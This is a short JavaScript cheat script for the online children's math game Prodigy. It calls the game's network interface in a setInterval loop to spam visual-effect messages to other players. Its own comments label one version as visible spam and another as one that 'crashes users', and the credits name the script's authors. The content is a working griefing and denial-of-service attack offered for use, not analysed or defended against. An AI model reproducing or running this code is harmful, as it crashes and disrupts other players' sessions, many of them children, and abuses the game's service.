//Small spam. Doesn't crash users:
setInterval(function(){
PIXI.game.prodigy.network.emitMessage({action:"fx",data:{type:1, userID: PIXI.game.prodigy.player.userID}})
},10); //THIS SCRIPT DOES APPEAR FOR OTHERS

//Large spam. Crashes users:
setInterval(()=>PIXI.game.prodigy.network.emitMessage({"action":"fx","data":{"type":3,"userID":PIXI.game.prodigy.player.userID,"x":Math.floor(Math.random() * 1280),"y":Math.floor(Math.random() * 720)}}));



/*CREDIT*/
/*DaChickenKing | Did research on the SocketInterface in the Discord Server
TNTHacker2015 | Made script*/
